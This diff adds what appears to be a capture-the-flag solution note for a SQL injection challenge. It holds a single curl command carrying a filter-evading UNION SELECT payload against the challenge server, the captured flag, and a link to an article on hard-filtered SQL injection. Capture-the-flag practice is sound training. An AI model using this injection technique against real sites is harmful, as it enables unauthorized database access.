@@ -1,0 +1,8 @@
+curl 'https://sql1.wanictf.org/index.php?year=(0)union(select(name),(0)from(test_db.anime))' | grep "FLAG{"
+
+
+
+
+FLAG{53cur3_5ql_a283b4dffe}
+
+https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/
